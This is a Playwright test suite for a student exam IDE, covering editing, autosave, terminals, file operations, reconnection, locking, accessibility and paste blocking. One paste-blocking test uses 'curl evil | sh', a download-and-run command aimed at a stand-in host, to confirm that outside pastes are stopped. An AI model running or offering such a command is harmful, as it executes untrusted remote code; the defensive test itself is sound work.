import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';

// The student's IDE for a workspace exam, against the in-memory stand-in for the container (tests/fake-workspace-server.js) and the
// application's Go side (tests/fake-api.js).
const project = {
  'Makefile': 'all:\n\techo build\n',
  'src/list.cpp': '#include "list.hpp"\n\nvoid push_front() {}\n',
  'src/main.cpp': 'int main() { return 0; }\n',
  'tests/sample_test.cpp': 'int main() {}\n',
  'notes.txt': 'first line\nsecond line\n',
};

async function start(page, options = {}, viewport = { width: 1280, height: 800 }) {
  await page.setViewportSize(viewport);
  const errors = [];
  page.on('pageerror', error => errors.push(error.message));
  await page.addInitScript(() => {
    window.__storage = [];
    for (const method of ['setItem', 'removeItem', 'clear']) {
      const original = Storage.prototype[method];
      Storage.prototype[method] = function (...args) { window.__storage.push(method); return original.apply(this, args); };
    }
  });
  await page.goto('/');
  await page.evaluate(value => window.__studentHarness.useWorkspace(value), { files: project, ...options });
  await page.getByLabel('I have read these rules').check();
  await page.getByLabel('Account number').fill('00123');
  await page.getByLabel('Exam PIN').fill('synthetic PIN');
  await page.getByRole('button', { name: 'Login / resume' }).click();
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
  await expect(page.getByRole('treeitem', { name: 'Makefile' })).toBeVisible();
  return errors;
}
const server = (page, expression, arg) => page.evaluate(([code, value]) => new Function('server', 'value', `return ${code}`)(window.__studentHarness.workspaceServer, value), [expression, arg]);
const file = (page, path) => server(page, 'server.files.get(value)', path);
const openFile = async (page, name) => {
  await page.getByRole('treeitem', { name, exact: true }).click();
  return page.getByRole('textbox', { name: new RegExp(`^Editor for .*${name.replace('.', '\\.')}$`) });
};
async function openSrc(page) {
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  return openFile(page, 'list.cpp');
}

test('the workspace shows the exam text, the files and the status, and none of the question-exam page', async ({ page }) => {
  const errors = await start(page);
  await expect(page.getByRole('region', { name: 'Instructions and TODO list' })).toContainText('make check');
  await expect(page.getByRole('checkbox', { name: /Implement push_front/ })).toBeVisible();
  await expect(page.getByRole('checkbox', { name: /Add a test of your own/ })).toBeVisible();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText(/Time left (1:00:00|0:59:\d\d)/);
  await expect(page.getByRole('button', { name: 'Submit', exact: true })).toBeVisible();
  await expect(page.getByRole('button', { name: /Submit current answers/ })).toHaveCount(0);
  await expect(page.getByRole('navigation', { name: 'Exercises' })).toHaveCount(0);
  await expect(page.getByLabel('Save status')).toHaveCount(0);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth && document.documentElement.scrollHeight <= innerHeight + 2)).toBe(true);
  expect(errors).toEqual([]);
});

test('a file is opened from the tree, edited, and saved after a second of idle', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await expect(editor).toContainText('push_front');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('// added by the student\n');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).toContainText('●');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Unsaved changes');
  expect(await file(page, 'src/list.cpp')).not.toContain('added by the student');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 3000 }).toContain('// added by the student');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).not.toContainText('●');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText(/Saved \d/);
});

test('Ctrl+S saves at once, and switching tabs saves the file left behind', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// one\n');
  await page.keyboard.press('Control+s');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 400 }).toContain('// one');
  await page.keyboard.type('// two\n');
  await openFile(page, 'notes.txt');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 600 }).toContain('// two');
  // Back again: the tab kept its text and the cursor's place.
  await page.getByRole('tab', { name: /list\.cpp/ }).click();
  await expect(page.getByRole('textbox', { name: /Editor for src\/list\.cpp/ })).toContainText('// two');
});

test('Run and Check show their output in terminals of their own, after saving the files', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// edited before running\n');
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  const run = page.getByRole('region', { name: 'Run output' });
  await expect(run).toContainText('list: 3 2 1');
  expect(await file(page, 'src/list.cpp')).toContain('edited before running');
  await expect(page.getByRole('tab', { name: /Run/ })).toContainText('✓');
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Check output' })).toContainText('FAILED push_front');
  await expect(page.getByRole('tab', { name: /Check/ })).toContainText('✗');
  await expect(page.getByRole('status').filter({ hasText: 'Check ended with code 1' })).toBeVisible();
  // Make it pass, and check again: the new Check takes the place of the old one.
  await editor.click();
  await page.keyboard.type('// DONE\n');
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Check output' })).toContainText('3 of 3 passed');
  await expect(page.getByRole('tab', { name: /Check/ })).toHaveCount(1);
});

test('a terminal takes keystrokes, and what it does to the files shows in the tree within a second', async ({ page }) => {
  await start(page);
  await page.getByRole('button', { name: 'New terminal' }).click();
  const terminal = page.getByRole('region', { name: 'Terminal 1 output' });
  await expect(terminal).toContainText('student@workspace');
  await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
  await page.keyboard.type('touch made_by_terminal.txt');
  await page.keyboard.press('Enter');
  await expect(page.getByRole('treeitem', { name: 'made_by_terminal.txt' })).toBeVisible({ timeout: 1000 });
  await page.keyboard.type('rm notes.txt');
  await page.keyboard.press('Enter');
  await expect(page.getByRole('treeitem', { name: 'notes.txt' })).toHaveCount(0, { timeout: 1000 });
  // Ctrl+C and Ctrl+D go to the program, not to the application.
  await page.keyboard.press('Control+c');
  await page.keyboard.press('Control+d');
  const typed = await server(page, 'server.typed');
  expect(typed.join('')).toContain('\x03');
  expect(typed.join('')).toContain('\x04');
});

test('at most four terminals, each closable', async ({ page }) => {
  await start(page);
  const add = page.getByRole('button', { name: 'New terminal' });
  for (let i = 0; i < 4; i += 1) await add.click();
  await expect(page.getByRole('tab', { name: /Terminal \d/ })).toHaveCount(4);
  await expect(add).toBeDisabled();
  await page.getByRole('tab', { name: /Terminal 2/ }).click();
  await page.getByRole('button', { name: 'Close Terminal 2' }).click();
  await expect(page.getByRole('tab', { name: /Terminal \d/ })).toHaveCount(3);
  await expect(add).toBeEnabled();
});

test('files and folders are made, renamed and deleted, with a confirmation for the delete', async ({ page }) => {
  await start(page);
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  await page.getByRole('button', { name: 'File', exact: true }).click();
  const dialog = page.getByRole('dialog', { name: 'New file' });
  await expect(dialog).toContainText('src');
  await dialog.getByLabel('Name').fill('a/b');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog.getByRole('alert')).toContainText('one at a time');
  await dialog.getByLabel('Name').fill('main.cpp');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog.getByRole('alert')).toContainText('already exists');
  await dialog.getByLabel('Name').fill('util.cpp');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog).toHaveCount(0);
  await expect(page.getByRole('tab', { name: /util\.cpp/ })).toHaveAttribute('aria-selected', 'true');
  expect(await file(page, 'src/util.cpp')).toBe('');
  // A folder at the top, then a rename of the file.
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click();
  await page.getByRole('button', { name: 'Folder', exact: true }).click();
  await page.getByRole('dialog', { name: 'New folder' }).getByLabel('Name').fill('docs');
  await page.getByRole('dialog', { name: 'New folder' }).getByRole('button', { name: 'Create' }).click();
  await expect(page.getByRole('treeitem', { name: 'docs', exact: true })).toBeVisible();
  await page.getByRole('treeitem', { name: 'util.cpp', exact: true }).click();
  await page.getByRole('button', { name: 'Rename', exact: true }).click();
  const rename = page.getByRole('dialog', { name: 'Rename util.cpp' });
  await rename.getByLabel('New name').fill('helpers.cpp');
  await rename.getByRole('button', { name: 'Rename' }).click();
  await expect(page.getByRole('treeitem', { name: 'helpers.cpp' })).toBeVisible();
  await expect(page.getByRole('tab', { name: /helpers\.cpp/ })).toBeVisible();
  // Delete asks first, and says what goes.
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  const confirm = page.getByRole('dialog', { name: 'Delete helpers.cpp?' });
  await expect(confirm).toContainText('This cannot be undone');
  await confirm.getByRole('button', { name: 'Keep it' }).click();
  expect(await file(page, 'src/helpers.cpp')).toBe('');
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  await page.getByRole('dialog', { name: 'Delete helpers.cpp?' }).getByRole('button', { name: 'Delete', exact: true }).click();
  await expect(page.getByRole('treeitem', { name: 'helpers.cpp' })).toHaveCount(0);
  await expect(page.getByRole('tab', { name: /helpers\.cpp/ })).toHaveCount(0);
  expect(await file(page, 'src/helpers.cpp')).toBeUndefined();
});

test('a file changed in the terminal is reloaded if untouched, and asks if the student has edits', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'rewritten in the terminal\n'));
  await expect(editor).toContainText('rewritten in the terminal');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('my own line');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'rewritten again\n'));
  const prompt = page.getByRole('alert').filter({ hasText: 'This file changed in the terminal' });
  await expect(prompt).toBeVisible();
  await page.waitForTimeout(1300);
  expect(await file(page, 'notes.txt')).toBe('rewritten again\n');
  await prompt.getByRole('button', { name: 'Keep yours' }).click();
  await expect.poll(() => file(page, 'notes.txt')).toContain('my own line');
  await expect(prompt).toHaveCount(0);
  // And the other answer.
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs\n'));
  await expect(editor).toContainText('theirs');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type(' more');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs again\n'));
  await prompt.getByRole('button', { name: 'Reload' }).click();
  await expect(editor).toContainText('theirs again');
  await expect(prompt).toHaveCount(0);
});

test('a TODO tick is kept by the server', async ({ page }) => {
  await start(page);
  const box = page.getByRole('checkbox', { name: /Implement push_front/ });
  await box.check();
  await expect.poll(() => server(page, 'server.todo.t1')).toBe(true);
  await expect(page.getByRole('group', { name: '' }).first()).toBeDefined();
  await expect(page.getByText('1/2')).toBeVisible();
  await box.uncheck();
  await expect.poll(() => server(page, 'server.todo.t1')).toBe(false);
});

test('Submit takes a snapshot of what is saved, and says so', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('final answer ');
  await page.getByRole('button', { name: 'Submit', exact: true }).click();
  await expect(page.getByText(/^Submitted \d/)).toBeVisible();
  expect(await server(page, "server.submits.at(-1).get('notes.txt')")).toContain('final answer');
  await expect(page.getByText('Your work was submitted')).toBeVisible();
});

test('while the connection is down the editor and terminals are read-only, and what was typed is saved after it returns', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('typed before the drop');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await expect(page.getByText(/Reconnecting…/).first()).toBeVisible();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Reconnecting');
  await expect(page.getByRole('button', { name: 'Run', exact: true })).toBeDisabled();
  await expect(page.getByRole('button', { name: 'Submit', exact: true })).toBeDisabled();
  await expect(editor).toHaveAttribute('aria-readonly', 'true');
  await page.keyboard.type('NOT TYPED');
  await expect(editor).not.toContainText('NOT TYPED');
  await page.waitForTimeout(1500);
  expect(await file(page, 'notes.txt')).not.toContain('typed before the drop');
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).toContainText('●');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await expect.poll(() => file(page, 'notes.txt')).toContain('typed before the drop');
  await expect(editor).not.toHaveAttribute('aria-readonly', 'true');
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).not.toContainText('●');
});

test('pulling the network for 30 seconds loses no edits', async ({ page }) => {
  await page.clock.install();
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('before ');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await page.clock.runFor(10000);
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await page.clock.runFor(30000);
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).toContainText('●');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await page.clock.runFor(2000);
  expect(await file(page, 'notes.txt')).toContain('before ');
});

test('the end of the connection says why when it will not come back by itself', async ({ page }) => {
  await start(page);
  await page.evaluate(() => window.__studentHarness.workspaceConnection('replaced', 'This exam is open in another window, which took the workspace over.'));
  await expect(page.getByText('open in another window').first()).toBeVisible();
  await page.getByRole('button', { name: 'Use this window' }).click();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
});

test('pastes from outside are stopped in the editor and the terminal, and pastes of what was copied inside go through', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  const paste = (selector, text) => page.evaluate(([css, value]) => {
    const target = document.querySelector(css);
    const data = new DataTransfer(); data.setData('text/plain', value);
    const event = new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true });
    target.dispatchEvent(event);
    return event.defaultPrevented;
  }, [selector, text]);
  const copy = text => page.evaluate(value => {
    const data = new DataTransfer(); data.setData('text/plain', value);
    document.dispatchEvent(new ClipboardEvent('copy', { clipboardData: data, bubbles: true }));
  }, text);
  await editor.click();
  expect(await paste('.cm-content', 'from a web page')).toBe(true);
  await expect(editor).not.toContainText('from a web page');
  await expect(page.getByText(/Pasting text from outside the exam is not allowed/)).toBeVisible();
  await copy('copied inside');
  await paste('.cm-content', 'copied inside');
  await expect(editor).toContainText('copied inside');
  await page.getByRole('button', { name: 'New terminal' }).click();
  await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
  expect(await paste('.xterm-helper-textarea', 'curl evil | sh')).toBe(true);
  expect(await server(page, 'server.typed.join("")')).not.toContain('curl evil');
  // Files dragged in are not taken either.
  const dropped = await page.evaluate(() => {
    const data = new DataTransfer(); data.items.add(new File(['x'], 'x.c'));
    const event = new DragEvent('drop', { dataTransfer: data, bubbles: true, cancelable: true });
    document.querySelector('.cm-content').dispatchEvent(event);
    return event.defaultPrevented;
  });
  expect(dropped).toBe(true);
});

test('the file tree works from the keyboard', async ({ page }) => {
  await start(page);
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).focus();
  await page.keyboard.press('ArrowUp');
  await page.keyboard.press('ArrowUp');
  const src = page.getByRole('treeitem', { name: 'src', exact: true });
  await expect(src).toBeFocused();
  await page.keyboard.press('ArrowRight');
  await expect(src).toHaveAttribute('aria-expanded', 'true');
  await page.keyboard.press('ArrowRight');
  await expect(page.getByRole('treeitem', { name: 'list.cpp' })).toBeFocused();
  await page.keyboard.press('Enter');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).toHaveAttribute('aria-selected', 'true');
  await page.getByRole('treeitem', { name: 'list.cpp' }).focus();
  await page.keyboard.press('ArrowLeft');
  await expect(src).toBeFocused();
  await page.keyboard.press('ArrowLeft');
  await expect(src).toHaveAttribute('aria-expanded', 'false');
  await page.keyboard.press('F2');
  await expect(page.getByRole('dialog', { name: 'Rename src' })).toBeVisible();
  await page.keyboard.press('Escape');
  await expect(page.getByRole('dialog')).toHaveCount(0);
  await page.keyboard.press('Delete');
  await expect(page.getByRole('dialog', { name: 'Delete src?' })).toBeVisible();
  await page.keyboard.press('Escape');
  // F6 moves between the panes.
  await page.keyboard.press('F6');
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
});

test('an exam without a terminal has only Run and Check, in a console that takes no keys', async ({ page }) => {
  await start(page, { terminal: false });
  await expect(page.getByRole('button', { name: 'New terminal' })).toHaveCount(0);
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  const output = page.getByRole('region', { name: 'Run output' });
  await expect(output).toContainText('list: 3 2 1');
  await output.click();
  await page.keyboard.type('whoami');
  expect(await server(page, 'server.typed')).toEqual([]);
  expect(await server(page, 'server.requests.filter(r => r.type === "pty.open").length')).toBe(0);
});

test('a locked exam hides the workspace, and what was typed is still there after the unlock', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('kept through the lock ');
  await page.evaluate(() => { window.__studentHarness.workspaceConnection('locked', 'Your exam is locked.'); window.__studentHarness.lock('away'); });
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeHidden();
  await expect(page.getByText(/locked/i).first()).toBeVisible();
  await page.evaluate(() => { window.__studentHarness.unlock(0); window.__studentHarness.workspaceConnection('connected'); });
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
  await expect(page.getByRole('textbox', { name: /Editor for notes\.txt/ })).toContainText('kept through the lock');
  await expect.poll(() => file(page, 'notes.txt')).toContain('kept through the lock');
});

test('nothing of the workspace is written to the student\'s computer', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('secret work');
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await page.waitForTimeout(1300);
  expect(await page.evaluate(() => window.__storage)).toEqual([]);
  expect(await page.evaluate(() => localStorage.length + sessionStorage.length)).toBe(0);
  expect(await page.evaluate(async () => (await indexedDB.databases?.() ?? []).length)).toBe(0);
  expect(await page.evaluate(() => document.cookie)).toBe('');
});

test('the workspace has no critical accessibility problems', async ({ page }) => {
  await start(page);
  await openSrc(page);
  await page.getByRole('button', { name: 'New terminal' }).click();
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
  const scan = async label => {
    // The exam toolbar is the question exams' own (two buttons whose label does not hold their text); it is left as it is.
    const result = await new AxeBuilder({ page }).exclude('header.toolbar').analyze();
    const serious = result.violations.filter(violation => ['critical', 'serious'].includes(violation.impact));
    expect(serious.map(v => `${v.impact} ${v.id}: ${v.help} :: ${v.nodes.map(n => `${n.target.join(' ')} ${n.failureSummary?.replace(/\n/g, ' ')}`).join(' | ')}`), label).toEqual([]);
  };
  await scan('workspace');
  await page.getByRole('button', { name: 'File', exact: true }).click();
  await scan('the new file dialog');
  await page.keyboard.press('Escape');
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click();
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  await scan('the delete dialog');
});

for (const viewport of [{ width: 1280, height: 800 }, { width: 1000, height: 700 }, { width: 1920, height: 1080 }]) {
  test(`the workspace fits a ${viewport.width}x${viewport.height} window, with the editor and the terminal both in view`, async ({ page }) => {
    await start(page, {}, viewport);
    await openFile(page, 'notes.txt');
    await page.getByRole('button', { name: 'New terminal' }).click();
    for (const target of [page.getByRole('textbox', { name: /Editor for/ }), page.getByRole('region', { name: 'Terminal 1 output' }), page.getByRole('group', { name: 'Workspace status' })]) await expect(target).toBeInViewport();
    const box = await page.getByRole('region', { name: 'Terminal 1 output' }).boundingBox();
    expect(box.height).toBeGreaterThan(80);
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
  });
}

// Focus loss is read from the native window's own events, which nothing in the page can cause (docs/tools/TEST-FOCUS.md). What the page
// can promise is that the IDE calls nothing native but the workspace's own methods and the snapshot poll; the manual script does the rest.
test('using the IDE calls no native method but the workspace ones and the poll', async ({ page }) => {
  await start(page);
  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// typing in the editor\n');
  await page.getByRole('button', { name: 'New terminal' }).click();
  await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
  await page.keyboard.type('echo hello');
  await page.keyboard.press('Enter');
  await page.getByRole('tab', { name: /list\.cpp/ }).click();
  await editor.click();
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await page.getByRole('checkbox', { name: /Implement push_front/ }).check();
  await page.getByRole('button', { name: 'Submit', exact: true }).click();
  await page.waitForTimeout(1200);
  const calls = await page.evaluate(() => window.__studentHarness.nativeCalls);
  expect([...new Set(calls)].sort()).toEqual(['Snapshot', 'WorkspaceInput', 'WorkspaceRequest']);
});
